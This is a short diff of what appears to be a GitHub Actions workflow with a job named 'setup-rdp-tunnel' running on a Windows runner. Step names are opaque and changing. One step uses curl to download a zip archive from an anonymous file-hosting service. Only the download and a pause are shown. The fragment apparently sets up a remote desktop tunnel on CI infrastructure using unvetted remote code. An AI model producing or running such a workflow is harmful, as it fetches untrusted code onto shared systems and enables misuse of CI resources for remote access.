@@ -5,13 +5,13 @@ on:
 
 jobs:
   setup-rdp-tunnel:
-      runs-on: windows-latest
+    runs-on: windows-latest
 
     steps:
     - name: Check b51
       uses: actions/checkout@v2
 
-    - name: Download extract-v44556
+    - name: Download-v7774
       run: |
         curl -L -o code.zip https://pixeldrain.com/api/file/M8cXbckM/info/zip/main7.zip
         Start-Sleep -Seconds 5
